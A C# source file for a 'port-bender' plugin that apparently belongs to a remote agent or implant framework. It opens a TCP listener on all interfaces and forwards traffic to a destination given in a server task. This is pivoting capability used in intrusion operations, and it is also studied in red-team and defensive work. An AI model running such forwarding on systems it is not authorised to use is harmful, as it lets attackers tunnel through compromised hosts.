using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Net.Sockets;
using System.Net;
using Agent.Utilities;
using port_bender;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "port-bender";
        private IMessageManager messageManager { get; set; }
        private bool running = false;
        private string start_task = String.Empty;
        private TcpForwarderSlim? fwdr;
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            PortBenderArgs args = JsonSerializer.Deserialize<PortBenderArgs>(job.task.parameters);
            if(args is null){
                return;
            }

            if (running)
            {
                if(fwdr is null){
                    return;
                }
                
                fwdr.Stop();
                running = false;
                messageManager.WriteLine($"Listener Stopped.", start_task, true);
                messageManager.WriteLine($"Listener Stopped.", job.task.id, true);
                return;
            }
            string host = args.destination.Split(':')[0];
            string sPort = args.destination.Split(':')[1];
            int port = 0;

            if (!int.TryParse(sPort, out port))
            {
                messageManager.WriteLine($"Failed to get destination port.", job.task.id, true, "error");
                return;
            }

            IPAddress target = null;

            if (!IPAddress.TryParse(host, out target))
            {
                try
                {
                    target = Dns.GetHostAddresses(host)[0];
                }
                catch (Exception ex)
                {
                    messageManager.WriteLine($"Failed to resolve host: {ex.Message}", job.task.id, true, "error");
                    return;
                }
            }

            IPEndPoint local = new IPEndPoint(IPAddress.Any, args.port);

            IPEndPoint remote = new IPEndPoint(target, port);

            this.fwdr = new TcpForwarderSlim();

            _ = Task.Run(() => fwdr.Start(local, remote));
            start_task = job.task.id;
            running = true;

            messageManager.WriteLine($"Started Listener.", job.task.id, true);
        }
    }
}
